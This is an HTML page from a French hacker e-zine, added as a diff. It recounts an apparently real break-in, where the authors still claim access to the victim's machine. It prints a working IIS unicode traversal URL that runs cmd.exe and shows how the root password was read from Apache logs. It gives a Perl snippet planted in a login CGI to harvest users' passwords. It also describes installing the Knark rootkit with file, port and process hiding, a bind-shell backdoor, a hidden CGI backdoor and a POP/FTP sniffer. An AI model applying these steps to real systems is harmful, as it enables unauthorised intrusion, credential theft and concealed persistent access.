@@ -1,0 +1,168 @@
+<html>
+<head>
+<title>Lotfree #06</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#FFFFFF">
+<p align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="6">Petite 
+  histoire de hack</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+  <i>ou &quot;Les logs Apache c'est supeeer !!&quot;<br>
+  </i></font><font face="Verdana, Arial, Helvetica, sans-serif"><b>par OS4M4CKERS</b></font></p>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"> 
+<p>Voici un hack assez sp&eacute;cial, &ccedil;a commence par une simple faille 
+  unicode, et &ccedil;a se termine par le contr&ocirc;le de TOUT le r&eacute;seau.<br>
+  <br>
+  Je vous pr&eacute;sente un peu la cible. D'abord, il y a le site www.victim.com 
+  : IIS 5.0 <img src="../media/spice_di_counass.gif" width="134" height="40">, 
+  Windows 2000<br>
+  Y a aussi un serveur de webmail sur une autre machine mail.victim.com : (Unix, 
+  Apache 1.3.20, serveur telnet, ProFTP 1.2.2rc3, Sendmail 8.11.4)</p>
+<p>Le site www.victim.com souffrait de la faille unicode, je fait un peu le tour 
+  de la machine, je trouve la liste des comptes mail, je v&eacute;rifie si il 
+  n'y aurait pas une database de mail qui trainerait sur la machine:</p>
+<p> <font color="#FF0000">http://www.victim.com/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+/S+c:\*.mdb 
+  </font> </p>
+<p> Je trouve quelques bases de donn&eacute;es, je les t&eacute;l&eacute;charge, 
+  je constate que quelques pass sont du genre login2000 ou un truc du genre.<br>
+  J'essaye de m'identifier avec un compte (celui de l'admin) que j'ai trouv&eacute; 
+  dans la liste des comptes, on supposera que le login &eacute;tait: &quot;admin&quot;, 
+  j'essaye avec le pass: &quot;admin2002&quot;... Bingo<br>
+  J'essaye avec telnet, en esp&eacute;rant que l'admin n'a pas changer le fichier 
+  /etc/passwd, car si le fichier ressemble &agrave; &ccedil;a:</p>
+<p><font color="#FF0000">admin:x:100:100::/home/admin:/bin/false</font></p>
+<p>on peut pas se connecter en telnet, car /bin/false n'est pas un shell, mais 
+  heureusement dans ce cas le shell &eacute;tait correct (<font color="#FF0000">bin/sh</font>). 
+  Il ne restait plus qu'&agrave; avoir le pass du root.<br>
+  Je peux utiliser un exploit mais c'est pas int&eacute;ressant.<br>
+  La machine en question fait aussi tourner un serveur web qui propose une interface 
+  web pour lire ses mails (un webmail).<br>
+  On remarque aussi que cette interface poss&egrave;de une partie administrateur. 
+  En regardant comment ces scripts fonctionnent (des cgis) il doit &ecirc;tre 
+  possible de trouver le pass admin pour la gestion des mails.<br>
+  Je regarde un peu ce qu'il y a dans la machine, le propri&eacute;taire du r&eacute;pertoire 
+  /var/www/htdocs (qui &eacute;tait vide) est le root, je jette un coup d'oeil 
+  au contenu du r&eacute;pertoire <font color="#FF0000">/var/www/cgi-bin</font>, 
+  je r&eacute;cup&egrave;re tout les scripts, en j'&eacute;tudie le contenu des 
+  scripts, je m'aper&ccedil;ois que l'admin pouvait cr&eacute;er, supprimer, modifier 
+  des comptes avec des scripts cgi (ces derniers appelaient un script expect, 
+  vous trouverez des d&eacute;tails dans le tuto sur le prog en expect), mais 
+  il devait d'abord remplir un formulaire (<font color="#FF0000">dern.cgi</font>) 
+  dans lequel il devait fournir le pass du root, le pass &eacute;tait envoy&eacute; 
+  (post&eacute;) au m&ecirc;me script. Voici quelques extraits du fichier dern.cgi 
+  :</p>
+</font> 
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">------------------------------------<br>
+  $user=$form{</font><font color="#00FFFF" size="2" face="Verdana, Arial, Helvetica, sans-serif">'usnamea'</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">};</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+  $pasuser=$form{<font color="#00FFFF">'uspas'</font>};<br>
+  ----------- <br>
+  print <font color="#00FFFF">&quot;&lt;p align=\&quot;left\&quot;&gt;&lt;nobr&gt;&lt;b&gt;&lt;a 
+  style=\&quot;color: #ffffff\&quot; href=\&quot;/cgi-bin/ajout.cgi?pasman=<font color="#FF0000">$pasuser</font>\&quot;&gt; 
+  Ajout d'un utilisateur &lt;/a&gt;&lt;/b&gt;&lt;/nobr&gt;&lt;/p&gt;&quot;</font>;<br>
+  ------------------------------------</font></p>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"> 
+<p>Vous aurez compris que le pass du root est d&eacute;sign&eacute; par la variable 
+  $pasuser, donc on trouvera ais&eacute;ment le pass du root en cherchant dans 
+  les logs de Apache (si l'admin ne les a pas retir&eacute;) :</p>
+<p>[admin@mail /logs]$ cat access_log | grep pasman<br>
+  xxx.xxx.xxx.xxx - - [04/Aug/2002:10:52:56 +0100] &quot;GET /cgi-bin/ajout.cgi?<font color="#FF0000">pasman=admin2003victim</font> 
+  HTTP/1.1&quot; 200 1344<br>
+  xxx.xxx.xxx.xxx - - [04/Aug/2002:10:53:40 +0100] &quot;GET /cgi-bin/ajout.cgi?<font color="#FF0000">pasman=admin2003victim</font> 
+  HTTP/1.1&quot; 200 1344<br>
+  xxx.xxx.xxx.xxx - - [04/Aug/2002:10:53:57 +0100] &quot;GET /cgi-bin/ajout.cgi?<font color="#FF0000">pasman=admin2003victim</font> 
+  HTTP/1.1&quot; 200 1344<br>
+  xxx.xxx.xxx.xxx - - [04/Aug/2002:10:54:39 +0100] &quot;GET /cgi-bin/ajout.cgi?<font color="#FF0000">pasman=admin2003victim</font> 
+  HTTP/1.1&quot; 200 1344</p>
+<p>Et voil&agrave;... on a le pass du root (qui n'est pas tr&egrave;s original).<br>
+  <img src="../media/boulettour.gif" width="116" height="86">Promis la prochaine 
+  fois on devine le pass tout seul comme des grands ;-)</p>
+<p>Maintenant, je veux avoir les pass de tous ceux qui s'identifient sur le serveur, 
+  deux choix se pr&eacute;sentent &agrave; moi, soit je met un sniffer POP, soit 
+  je modifie le script cgi pour que celui-ci enregistre tout les pass qu'il recoit 
+  dans un fichier.</p>
+<p> La premi&egrave;re solution est assez facile &agrave; mettre en place...<br>
+  Pour la deuxi&egrave;me solution voil&agrave; ce que j'ins&egrave;re dans le 
+  script d'authentification:</p>
+<p>----------------------------------------<br>
+  open(sbfile,<font color="#00FFFF">&quot;&gt;&gt; /tmp/.sblog&quot;</font>);<br>
+  print sbfile <font color="#00FFFF">&quot;</font><font color="#FF0000">$dS</font> 
+  <font color="#00FFFF">-</font> <font color="#FF0000">$pass</font><font color="#00FFFF">\n&quot;</font>;<br>
+  close(sbfile);<br>
+  ----------------------------------------</p>
+<p>$dS d&eacute;signe le login et $pass le pass ;)</p>
+<p>De cette mani&egrave;re on avait une bonne quantit&eacute; de pass Unix (&agrave; 
+  cause du fonctionnement des scripts cgis utilis&eacute;s, les login/pass du 
+  webmail sont les m&ecirc;me que les accounts Unix).</p>
+<p>Ce qu'on a fait ensuite c'est installer une rootkit. On a tourn&eacute; notre 
+  choix vers Knark qui est une kernel rootkit pour les noyaux Linux 2.2. Quelques 
+  fonctionnalit&eacute;s pour vous montrer &agrave; quel point c'est puissant 
+  :<br>
+  D'abord il faut g&eacute;n&eacute;rer le module (<i>make</i>) puis l'ins&eacute;rer 
+  dans le m&eacute;moire (<i>insmod knark</i>).<br>
+  Knark est compos&eacute; d'un ensemble de commandes qui dialoguent avec le module 
+  Knark.<br>
+  Il y a la commande <i>hidef</i> qui permet de cacher des fichiers et des r&eacute;pertoires 
+  quand quelqu'un fait un <i>ls</i> ou un <i>du</i> (on a commenc&eacute; par 
+  cacher le rep de knark).<br>
+  La commande <i>nethide</i> permet de retirer certaines lignes quand quelqu'un 
+  tape <i>netstat</i>. Par exemple <i>nethide &quot;:9876&quot;</i> permet de 
+  cacher que le port 9876 est ouvert.<br>
+  La commande <i>rootme</i> permet de lancer une commande avec les droits root. 
+  Pour reprendre l'acc&egrave;s root on peut donc tapper <i>rootme /bin/sh</i>.<br>
+  Un dernier truc que j'adore c'est la possibilit&eacute; de cacher des processus 
+  aux commandes <i>ps</i> et <i>top</i> simplement en envoyant un signal 31.</p>
+<p>On a install&eacute; plusieurs backdoors. D&eacute;j&agrave; une backdoor qui 
+  &eacute;coute sur un port, demande un pass et bind un shell si le pass est correct.<br>
+  Une fois le prog lanc&eacute; on a fait <i>nethide &quot;:29369&quot;</i> et 
+  <i>kill -31 ovas0n</i> (le nom de la backdoor) pour cacher la backdoor.</p>
+<p>Une backdoor cgi a &eacute;t&eacute; install&eacute;e puis cach&eacute;e (<i>hidef 
+  /var/www/cgi-bin/gH-cgi.cgi</i>).</p>
+<p>Histoire d'achever le r&eacute;zo on a mis un sniffer (eth0sniff) qui r&eacute;cup&egrave;re 
+  les login/pass FTP et POP3.</p>
+<p>Voil&agrave;, apr&egrave;s &ccedil;a j'ai r&eacute;cup&eacute;r&eacute; les 
+  pass des admins (il y en avait beaucoup, on se demande ce qu'ils faisaient...<br>
+  <img src="../media/dj.gif" width="100" height="100">...<img src="../media/potekro.gif" width="57" height="28">...<img src="../media/fuck1.gif" width="24" height="20">... 
+  en fait je pr&eacute;f&egrave;re pas le savoir <img src="../media/arf.gif" width="55" height="46">),<br>
+  en lisant leur mails j'ai r&eacute;cup&eacute;r&eacute; beaucoup d'infos comme 
+  les pass des routeurs. Les routeurs en question &eacute;taient des Access Server, 
+  les m&ecirc;mes routeurs que les ISP (pour les connexions RTC).</p>
+<p>Et pour rigoler voici les ports ouverts dans inetd :<br>
+  <br>
+  time stream tcp nowait root internal<br>
+  time dgram udp wait root internal<br>
+  ftp stream tcp nowait root /usr/sbin/tcpd proftpd<br>
+  telnet stream tcp nowait root /usr/sbin/tcpd in.telnetd<br>
+  comsat dgram udp wait root /usr/sbin/tcpd in.comsat<br>
+  shell stream tcp nowait root /usr/sbin/tcpd in.rshd -L<br>
+  login stream tcp nowait root /usr/sbin/tcpd in.rlogind<br>
+  ntalk dgram udp wait root /usr/sbin/tcpd in.talkd<br>
+  pop3 stream tcp nowait root /usr/sbin/tcpd ipop3d<br>
+  <font color="#FF0000">finger stream tcp nowait nobody /usr/sbin/tcpd in.fingerd 
+  -u</font> (h&eacute; !! On vient de trouver le dernier admin qui fait tourner 
+  finger :)<br>
+  auth stream tcp wait nobody /usr/sbin/in.identd in.identd -P/dev/null<br>
+  netbios-ssn stream tcp nowait root /usr/sbin/smbd smbd<br>
+  netbios-ns dgram udp wait root /usr/sbin/nmbd nmbd</p>
+</font> 
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Remèdes :<br>
+  &deg;&deg;&deg;&deg;&deg;&deg;&deg;&deg;&deg;<br>
+  -D'abord virer l'admin ;)<br>
+  -Comme je l'ai dis pr&eacute;c&eacute;demment, il aurait fallu changer le fichier 
+  /etc/passwd, pour que personnes ne puisse se connecter sur les serveurs telnet 
+  et FTP.<br>
+  -Un serveur FTP n'est pas vraiment n&eacute;cessaire, vu que le site ne n&eacute;cessite 
+  pas de MAJ et en plus un serveur telnet est d&eacute;j&agrave; pr&eacute;sent.<br>
+  -J'ai pas cherch&eacute; de failles pour le serveur FTP, SMTP, HTTP ou le kernel, 
+  mais une update ne serait pas un luxe.<br>
+  -Question s&eacute;curit&eacute;, je ne crois pas que utiliser des scripts pour 
+  ajouter des comptes, soit une bonne id&eacute;e.</font><br>
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2">-Il faudrait que 
+  les logs soient moins parlant ou limiter leur acc&egrave;s seulement aux admins</font></p>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+<p>La suite dans le prochain num&eacute;ro... (peut-&ecirc;tre)</p>
+<p>P.S: Ce hack a &eacute;t&eacute; co-r&eacute;alis&eacute; par sirius_black 
+  et moi. Pour des raisons que vous pouvez comprendre (on a toujours acc&egrave;s 
+  &agrave; la b&eacute;cane) le nom de la victime n'a pas &eacute;t&eacute; r&eacute;v&eacute;l&eacute;.</p>
+</font>
+</body>
+</html>
